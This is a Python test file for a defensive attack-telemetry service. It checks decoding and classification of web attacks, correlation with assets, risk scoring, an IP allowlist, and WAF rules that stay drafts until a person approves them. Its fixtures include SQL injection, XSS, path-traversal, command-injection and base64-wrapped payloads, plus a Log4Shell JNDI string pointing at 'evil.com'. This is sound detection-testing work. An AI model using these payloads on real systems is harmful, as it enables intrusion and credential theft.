"""Items 37 + 38 -- Attack Surface Telemetry: decode, classify, correlate,
score, act; plus the auto-enrichment closed loop and its guardrails."""
import os, sys, asyncio, uuid
from datetime import datetime, timezone, timedelta
os.environ["MONGO_URL"] = "mongodb://localhost:27017"
os.environ["DB_NAME"] = "test_attack_telemetry"
os.environ["JWT_SECRET"] = "testsecret"
sys.path.insert(0, ".")

from mongomock_motor import AsyncMongoMockClient
import db as db_module
db_module.client = AsyncMongoMockClient()
db_module.db = db_module.client["test_attack_telemetry"]

import server
import auth_utils
from routes import attack_telemetry as at_route
at_route.db = db_module.db
import attack_telemetry as at

from fastapi.testclient import TestClient

admin_user = {"id": "u1", "email": "admin@x.com", "role": "admin", "name": "Admin", "teams": []}
app = server.app
app.dependency_overrides[auth_utils.get_current_user] = lambda: admin_user
client = TestClient(app)
db = db_module.db


def run(coro):
    return asyncio.get_event_loop().run_until_complete(coro)


# =========================================================================
# Decoding
# =========================================================================

assert "' or 1=1" in at.decode_payload("%27%20or%201%3D1").lower()
assert "union select" in at.decode_payload("%2575nion%2520select").lower() or \
       "union select" in at.decode_payload("%75nion%20select").lower()
assert "<script>" in at.decode_payload("%3Cscript%3E").lower()
assert "../../etc/passwd" in at.decode_payload("..%2F..%2Fetc%2Fpasswd")
assert "<script>" in at.decode_payload("\\u003cscript\\u003e").lower()
# base64-wrapped payload
import base64
b64 = base64.b64encode(b"cat /etc/passwd; whoami").decode()
assert "/etc/passwd" in at.decode_payload(f"cmd={b64}")
print("PASS: payload decoding unwraps URL-encoding (incl. double), unicode/hex escapes, HTML entities, and base64")


# =========================================================================
# Classification
# =========================================================================

sqli = at.classify_request(url="site.com/products", query="id=1' UNION SELECT username,password FROM users--")
assert sqli and sqli["attack_type"] == "sql_injection"
assert sqli["attack_technique"] == "T1190" and sqli["attack_tactic"] == "Initial Access"
assert sqli["severity"] == "Critical" and sqli["confidence"] >= 0.8

xss = at.classify_request(url="site.com/search", query="q=<script>document.cookie</script>")
assert xss["attack_type"] == "xss" and xss["attack_technique"] == "T1059.007"

trav = at.classify_request(url="site.com/../../../etc/passwd")
assert trav["attack_type"] == "path_traversal" and trav["attack_technique"] == "T1083"

cmd = at.classify_request(url="site.com/ping", query="host=127.0.0.1;whoami")
assert cmd["attack_type"] == "command_injection" and cmd["attack_tactic"] == "Execution"

log4 = at.classify_request(url="site.com/", user_agent="${jndi:ldap://evil.com/a}")
assert log4["attack_type"] == "log4shell" and log4["severity"] == "Critical"

scan = at.classify_request(url="site.com/", user_agent="sqlmap/1.7")
assert scan["attack_type"] == "scanner" and scan["confidence"] <= 0.6, \
    "a bare scanner UA is weaker evidence than a real payload"

assert at.classify_request(url="site.com/about", query="page=2") is None
assert at.classify_request(url="site.com/products/widget-3000") is None
print("PASS: classifier identifies SQLi/XSS/traversal/cmd-injection/log4shell/scanners with ATT&CK mapping, "
      "caps scanner-only confidence, and stays quiet on benign traffic")

# encoded attacks still classify, and obfuscation RAISES confidence
plain = at.classify_request(url="s.com/x", query="id=1' UNION SELECT a FROM b--")
enc = at.classify_request(url="s.com/x", query="id=1%27%20UNION%20SELECT%20a%20FROM%20b--")
assert enc is not None and enc["attack_type"] == "sql_injection"
assert enc["was_encoded"] and enc["confidence"] >= plain["confidence"]
print("PASS: encoded payloads are decoded before matching, and obfuscation increases confidence rather than evading")

# multiple families agreeing raises confidence
multi = at.classify_request(url="s.com/x", query="id=1' UNION SELECT 1--&next=<script>alert(1)</script>")
assert len(multi["attack_types"]) >= 2 and multi["confidence"] > plain["confidence"]
print("PASS: independent signature families agreeing raises confidence above any single match")


# =========================================================================
# Correlation + scoring
# =========================================================================

def _reset():
    for c in ("attack_observations", "attack_waf_rules", "attack_ip_allowlist",
               "attack_telemetry_cursors", "ioc_watchlist", "assets", "findings",
               "security_events", "osint_findings", "integrations"):
        run(db[c].delete_many({}))


_reset()
run(db.assets.insert_one({"id": "asset-web", "hostname": "www.eaglecounty.com",
                           "ip": "10.0.0.5", "criticality": "Critical"}))
# an OPEN SQLi finding on that host -- CWE-89 maps to T1190
run(db.findings.insert_one({"id": "f-sqli", "asset_id": "asset-web", "cwe": "CWE-89",
                             "status": "New", "severity": "Critical", "title": "SQL injection"}))

obs = {"source_ip": "203.0.113.7", "host": "www.eaglecounty.com", "path": "/products",
       "query": "id=1' UNION SELECT a FROM b--", "cf_action": "log",
       "origin_status": 200, "observed_at": at._now_iso(),
       **at.classify_request(url="www.eaglecounty.com/products", query="id=1' UNION SELECT a FROM b--")}
enr = run(at.correlate_observation(db, obs))
assert enr["asset_id"] == "asset-web" and enr["asset_criticality"] == "Critical"
assert enr["has_matching_vulnerability"] is True
assert "f-sqli" in enr["matching_finding_ids"]
print("PASS: correlation resolves the target host to an asset and detects a matching OPEN vulnerability for the technique")

scored_hit = at.score_observation({**obs, **enr})
# same attack, but Cloudflare blocked it and there's no matching vuln
blocked = at.score_observation({**obs, **enr, "cf_action": "block", "origin_status": None,
                                 "has_matching_vulnerability": False})
assert scored_hit > blocked + 20, (scored_hit, blocked)
assert scored_hit >= 70
print(f"PASS: business risk score weights reached-origin + matching vulnerability heavily "
      f"({scored_hit} unblocked-with-vuln vs {blocked} blocked-without)")


# =========================================================================
# Allowlist guardrail (item 38)
# =========================================================================

_reset()
run(db.attack_ip_allowlist.insert_many([
    {"id": "a1", "value": "10.0.0.0/8", "reason": "office egress"},
    {"id": "a2", "value": "198.51.100.9", "reason": "our own scanner"},
]))
assert run(at.is_allowlisted(db, "10.4.5.6"))["reason"] == "office egress"
assert run(at.is_allowlisted(db, "198.51.100.9"))
assert run(at.is_allowlisted(db, "203.0.113.7")) is None
print("PASS: the allowlist matches both single IPs and CIDR ranges")

allow_obs = {**obs, "source_ip": "10.4.5.6"}
enr2 = run(at.correlate_observation(db, allow_obs))
assert enr2["allowlisted"] is True
assert at.score_observation({**allow_obs, **enr2}) <= 10, "allowlisted traffic must never score as a real attack"
print("PASS: allowlisted sources are recognized BEFORE enrichment and can never score as a real attack")


# =========================================================================
# End-to-end ingest with a fake Cloudflare GraphQL API
# =========================================================================

FIREWALL_ROWS = [
    {"action": "log", "datetime": "2026-07-28T10:00:00Z", "clientIP": "203.0.113.7",
     "clientAsn": 64500, "clientCountryName": "Elbonia",
     "clientRequestHTTPHost": "www.eaglecounty.com", "clientRequestPath": "/products",
     "clientRequestQuery": "id=1' UNION SELECT username FROM users--",
     "clientRequestHTTPMethodName": "GET", "userAgent": "curl/8",
     "ruleId": None, "originResponseStatus": 200, "edgeResponseStatus": 200},
    {"action": "block", "datetime": "2026-07-28T10:01:00Z", "clientIP": "203.0.113.99",
     "clientAsn": 64501, "clientCountryName": "Elbonia",
     "clientRequestHTTPHost": "www.eaglecounty.com", "clientRequestPath": "/search",
     "clientRequestQuery": "q=<script>alert(1)</script>",
     "clientRequestHTTPMethodName": "GET", "userAgent": "Mozilla/5.0",
     "ruleId": "waf-xss", "originResponseStatus": None, "edgeResponseStatus": 403},
    # benign -- must NOT create an observation
    {"action": "log", "datetime": "2026-07-28T10:02:00Z", "clientIP": "203.0.113.50",
     "clientAsn": 64502, "clientCountryName": "Elbonia",
     "clientRequestHTTPHost": "www.eaglecounty.com", "clientRequestPath": "/about",
     "clientRequestQuery": "page=2", "clientRequestHTTPMethodName": "GET",
     "userAgent": "Mozilla/5.0", "originResponseStatus": 200, "edgeResponseStatus": 200},
    # duplicate of the first -- must MERGE, not create a second row
    {"action": "log", "datetime": "2026-07-28T10:03:00Z", "clientIP": "203.0.113.7",
     "clientAsn": 64500, "clientCountryName": "Elbonia",
     "clientRequestHTTPHost": "www.eaglecounty.com", "clientRequestPath": "/products",
     "clientRequestQuery": "id=1' UNION SELECT password FROM users--",
     "clientRequestHTTPMethodName": "GET", "userAgent": "curl/8",
     "originResponseStatus": 200, "edgeResponseStatus": 200},
]


class Resp:
    def __init__(self, payload, status_code=200):
        self._p = payload
        self.status_code = status_code
        self.text = str(payload)[:200]
    def json(self):
        return self._p


class FakeCF:
    def __init__(self, *a, **kw): pass
    async def __aenter__(self): return self
    async def __aexit__(self, *a): return False
    async def post(self, url, **kw):
        q = (kw.get("json") or {}).get("query", "")
        if "firewallEventsAdaptive(" in q:
            return Resp({"data": {"viewer": {"zones": [{"firewallEventsAdaptive": FIREWALL_ROWS}]}}})
        if "httpRequestsAdaptive(" in q:
            return Resp({"data": {"viewer": {"zones": [{"httpRequestsAdaptive": []}]}}})
        if "settings" in q:
            return Resp({"data": {"viewer": {"zones": [{"settings": {
                "firewallEventsAdaptiveMaxDuration": 24,
                "httpRequestsAdaptiveMaxDuration": 168}}]}}})
        return Resp({"data": {}})


import httpx
_real = httpx.AsyncClient
httpx.AsyncClient = FakeCF

_reset()
run(db.assets.insert_one({"id": "asset-web", "hostname": "www.eaglecounty.com",
                           "ip": "10.0.0.5", "criticality": "Critical"}))
run(db.findings.insert_one({"id": "f-sqli", "asset_id": "asset-web", "cwe": "CWE-89",
                             "status": "New", "severity": "Critical", "title": "SQL injection"}))

r = client.post("/api/v1/attack-telemetry/ingest", json={"minutes": 60})
assert r.status_code == 400, "must refuse before Cloudflare is configured"
run(db.integrations.insert_one({"id": "cf", "name": "Cloudflare", "type": "telemetry",
                                 "config": {"api_key": "tok", "zone_id": "zone123"}}))

r = client.post("/api/v1/attack-telemetry/ingest", json={"minutes": 60})
assert r.status_code == 200, r.text
res = r.json()
assert res["firewall_events"] == 4
assert res["classified"] == 3, "the benign /about request must not be classified"
assert res["observations_created"] == 2 and res["observations_merged"] == 1
print("PASS: ingest classifies only real attacks, dedupes repeat payloads from the same source/path, "
      "and refuses cleanly when Cloudflare isn't configured")

obs_rows = run(db.attack_observations.find({}, {"_id": 0}).to_list(10))
sqli_row = next(o for o in obs_rows if o["attack_type"] == "sql_injection")
assert sqli_row["hit_count"] == 2                       # merged duplicate
assert sqli_row["asset_id"] == "asset-web"
assert sqli_row["has_matching_vulnerability"] is True
assert sqli_row["business_risk_score"] >= 70
xss_row = next(o for o in obs_rows if o["attack_type"] == "xss")
assert xss_row["cf_action"] == "block"
assert xss_row["business_risk_score"] < sqli_row["business_risk_score"]
print("PASS: a served exploit against a vulnerable critical asset outranks a blocked probe")

# --- item 38(A): source IP auto-created as a confidence-tagged indicator with the full why
ioc = run(db.ioc_watchlist.find_one({"value": "203.0.113.7"}, {"_id": 0}))
assert ioc and ioc["source"] == "auto/cf-exploit"
assert ioc["auto_created"] is True and ioc["review_status"] == "unreviewed"
assert ioc["confidence"] >= 0.7
d = ioc["detail"]
assert d["attack_type"] == "sql_injection" and d["attack_technique"] == "T1190"
assert d["target_host"] == "www.eaglecounty.com" and d["target_path"] == "/products"
assert d["decoded_payload"] and d["observed_at"] and d["matched_signatures"]
print("PASS: item 38(A) -- an unknown attacking IP is auto-added as a CONFIDENCE-TAGGED indicator carrying the "
      "full why: payload, classification, ATT&CK technique, target host/path, and timestamp")

# --- item 38(B): the attack is attached to the targeted asset's record
r = client.get("/api/v1/assets/asset-web/attacks")
a = r.json()
assert a["total_observations"] == 2
assert a["total_hits"] == 3                             # 2 sqli hits + 1 xss
assert a["blocked_hits"] == 1 and a["reached_origin_hits"] == 2
assert a["matching_vulnerability_count"] == 1
print("PASS: item 38(B) -- attempted exploits and blocks are attached to the targeted asset's record")

# security events raised
assert run(db.security_events.count_documents({"event_type": "exploit_attempt"})) >= 1
print("PASS: classified attacks raise exploit_attempt security events")


# =========================================================================
# Act -- drafted WAF rules are NEVER auto-applied
# =========================================================================

rules = run(db.attack_waf_rules.find({}, {"_id": 0}).to_list(10))
assert rules, "a high-confidence attack should draft a rule"
rule = rules[0]
assert rule["status"] == "draft", "rules must NEVER be created already-applied"
assert rule["applied_at"] is None and rule["applied_by"] is None
assert rule["auto_eligible"] is False, "one observation is not a repeat offender"
assert "ip.src eq" in rule["expression"]
assert rule["rationale"]["attack_type"] == "sql_injection"
print("PASS: WAF rules are DRAFTED for human review, never auto-applied, and carry their rationale")

r = client.patch(f"/api/v1/attack-telemetry/waf-rules/{rule['id']}", json={"status": "approved"})
assert r.status_code == 200 and r.json()["decided_by"] == "admin@x.com"
r = client.patch(f"/api/v1/attack-telemetry/waf-rules/{rule['id']}", json={"status": "nonsense"})
assert r.status_code == 400
r = client.get("/api/v1/attack-telemetry/waf-rules/export")
assert r.json()["count"] == 1 and "ip.src eq 203.0.113.7" in r.json()["text"]
print("PASS: approval is an explicit human decision (recorded), and approved rules export as reviewable expressions")


# =========================================================================
# Item 38 guardrail -- false-positive downgrade
# =========================================================================

r = client.post("/api/v1/attack-telemetry/auto-indicators/203.0.113.7/review",
                 json={"review_status": "false_positive", "note": "our contracted pentester"})
assert r.status_code == 200
assert run(db.ioc_watchlist.find_one({"value": "203.0.113.7"}, {"_id": 0})) is None
assert run(db.attack_ip_allowlist.find_one({"value": "203.0.113.7"}, {"_id": 0}))
print("PASS: a false-positive auto-indicator is removed AND allowlisted, so it isn't re-added on the next poll")

# confirming instead promotes it
run(db.ioc_watchlist.insert_one({"id": "x", "ioc_type": "ip", "value": "203.0.113.99",
                                  "source": "auto/cf-exploit", "auto_created": True,
                                  "review_status": "unreviewed", "severity": "High"}))
r = client.post("/api/v1/attack-telemetry/auto-indicators/203.0.113.99/review",
                 json={"review_status": "confirmed"})
assert r.status_code == 200
ioc = run(db.ioc_watchlist.find_one({"value": "203.0.113.99"}, {"_id": 0}))
assert ioc["review_status"] == "confirmed" and ioc["auto_created"] is False
print("PASS: confirming an auto-indicator promotes it to a reviewed one")


# =========================================================================
# Retention discovery + local retention window
# =========================================================================

r = client.get("/api/v1/attack-telemetry/status")
st = r.json()
assert st["configured"] is True
ret = st["retention"]
assert ret["firewall_events_retention_hours"] == 24
assert ret["http_requests_retention_hours"] == 168
# poll at a quarter of the TIGHTEST window (24h/4 = 6h -> clamped to 60 min)
assert ret["recommended_poll_minutes"] == 60
assert st["local_retention_days"] == at.DEFAULT_RETENTION_DAYS
print("PASS: polling interval is derived from the zone's OWN reported retention (tightest dataset wins), "
      "not from hard-coded plan assumptions")

old_iso = (datetime.now(timezone.utc) - timedelta(days=200)).isoformat()
run(db.attack_observations.insert_many([
    {"id": "old-noise", "last_seen_at": old_iso, "status": "new", "business_risk_score": 10},
    {"id": "old-important", "last_seen_at": old_iso, "status": "confirmed", "business_risk_score": 85},
]))
deleted = run(at.prune_old_telemetry(db))
assert deleted >= 1
assert run(db.attack_observations.find_one({"id": "old-important"}, {"_id": 0})) is not None, \
    "confirmed/high-risk records must survive the retention sweep"
assert run(db.attack_observations.find_one({"id": "old-noise"}, {"_id": 0})) is None
print("PASS: the deliberate retention window prunes aged-out noise (IPs/URLs are personal data) while keeping "
      "confirmed and high-risk records")


# =========================================================================
# Views: successful-vs-blocked, summary
# =========================================================================

r = client.get("/api/v1/attack-telemetry/observations", params={"reached_origin": True})
assert all((o.get("cf_action") or "") not in ("block", "drop") for o in r.json()["items"])
r = client.get("/api/v1/attack-telemetry/observations", params={"reached_origin": False})
assert all((o.get("cf_action") or "") in ("block", "drop", "challenge", "managed_challenge", "jschallenge")
           for o in r.json()["items"])
print("PASS: observations can be filtered to what actually reached origin vs what Cloudflare blocked")

r = client.get("/api/v1/attack-telemetry/summary")
s = r.json()
assert s["observations"] >= 2
assert any(t["key"] == "sql_injection" for t in s["by_attack_type"])
assert s["attacks_matching_open_vulnerability"] >= 1
assert s["blocked_hits"] >= 1 and s["reached_origin_hits"] >= 1
print("PASS: the summary rolls up by attack type, country, source, and target, separating blocked from served")

# allowlist API validation
r = client.post("/api/v1/attack-telemetry/allowlist", json={"value": "not-an-ip"})
assert r.status_code == 400
r = client.post("/api/v1/attack-telemetry/allowlist", json={"value": "192.0.2.0/24", "reason": "partner"})
assert r.status_code == 200
r = client.post("/api/v1/attack-telemetry/allowlist", json={"value": "192.0.2.0/24"})
assert r.status_code == 409
print("PASS: the allowlist API validates IP/CIDR syntax and rejects duplicates")

httpx.AsyncClient = _real
